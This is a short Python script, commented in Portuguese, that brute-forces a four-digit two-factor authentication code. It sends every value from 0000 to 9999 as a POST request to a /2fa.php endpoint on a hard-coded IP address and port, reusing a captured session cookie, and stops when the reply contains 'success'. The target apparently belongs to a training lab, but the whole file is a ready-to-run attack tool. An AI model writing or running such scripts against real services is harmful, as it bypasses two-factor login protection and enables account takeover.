import requests

# URL do destino
url = "http://83.136.251.170:47490/2fa.php"

# Cabeçalhos HTTP
headers = {
    "Host": "83.136.251.170:47490",
    "Cache-Control": "max-age=0",
    "Accept-Language": "pt-BR,pt;q=0.9",
    "Origin": "http://83.136.251.170:47490",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://83.136.251.170:47490/2fa.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "PHPSESSID=g4jathtvln1lokdcvtelmusi9k",
    "Connection": "keep-alive"
}

# Função para tentar um código de 4 dígitos
def try_code(otp):
    # Dados da requisição (usando o código OTP)
    data = {
        "otp": otp
    }
    
    # Faz a requisição POST
    response = requests.post(url, headers=headers, data=data)
    
    # Verifica o código de resposta HTTP e retorna a resposta
    return response

# Tentativa de códigos de 0000 até 9999
for i in range(10000):
    # Formata o número para ser sempre 4 dígitos (ex: 0001, 0099, etc.)
    otp = f"{i:04d}"
    
    # Faz a tentativa com o código OTP
    response = try_code(otp)
    
    # Verifica se a resposta indica sucesso (personalize conforme necessário)
    if "success" in response.text.lower():  # Isso depende da resposta do servidor
        print(f"Código correto encontrado: {otp}")
        break
    else:
        print(f"Tentativa com OTP {otp} falhou.")

